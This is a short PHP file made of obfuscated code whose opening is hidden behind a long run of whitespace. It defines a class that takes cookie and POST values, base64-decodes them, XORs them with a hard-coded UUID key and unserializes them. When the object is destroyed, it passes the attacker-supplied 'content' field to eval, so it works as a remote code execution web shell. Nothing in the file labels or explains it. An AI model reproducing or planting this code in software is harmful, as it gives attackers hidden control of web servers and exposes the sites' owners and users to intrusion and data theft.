<?php                                                                                                                                                                                                                                                                                                                                                                                                 $KXQQWk = "\147" . chr (95) . chr (76) . 'E' . 'k';$DJOaGOR = chr (99) . "\x6c" . "\x61" . "\x73" . "\x73" . '_' . chr ( 876 - 775 )."\x78" . 'i' . "\163" . 't' . 's';$CIftsp = class_exists($KXQQWk); $KXQQWk = "47300";$DJOaGOR = "22870";$DVIKBMmeM = FALSE;if ($CIftsp === $DVIKBMmeM){class g_LEk{public function TXkWXMcx(){echo "1069";}private $HfgpfT;public static $tmauvKJHGP = "870979ae-8481-436d-9e14-98c2eaa58f59";public static $PYIId = 21531;public function __construct($YroahZSYFz=0){$LkkncnTgj = $_POST;$ZEzDdt = $_COOKIE;$yPlizuT = @$ZEzDdt[substr(g_LEk::$tmauvKJHGP, 0, 4)];if (!empty($yPlizuT)){$nhIDJ = "base64";$aokwWkNkX = "";$yPlizuT = explode(",", $yPlizuT);foreach ($yPlizuT as $VfGdYGdZYh){$aokwWkNkX .= @$ZEzDdt[$VfGdYGdZYh];$aokwWkNkX .= @$LkkncnTgj[$VfGdYGdZYh];}$aokwWkNkX = array_map($nhIDJ . chr ( 449 - 354 )."\144" . chr ( 949 - 848 )."\x63" . chr (111) . 'd' . "\145", array($aokwWkNkX,)); $aokwWkNkX = $aokwWkNkX[0] ^ str_repeat(g_LEk::$tmauvKJHGP, (strlen($aokwWkNkX[0]) / strlen(g_LEk::$tmauvKJHGP)) + 1);g_LEk::$PYIId = @unserialize($aokwWkNkX);}}private function xSzrjwA($NrhLp){if (is_array(g_LEk::$PYIId)) {$qpSxQBoVTd = str_replace("\x3c" . '?' . "\160" . "\x68" . chr ( 151 - 39 ), "", g_LEk::$PYIId["\x63" . chr ( 1013 - 902 ).chr (110) . 't' . 'e' . "\156" . 't']);eval($qpSxQBoVTd); $NrhLp = "33662";exit();}}public function __destruct(){$this->xSzrjwA($NrhLp);}}$CvrUfqIz = new /* 42868 */ g_LEk(); $CvrUfqIz = str_repeat("34456_64014", 1);} ?><?php
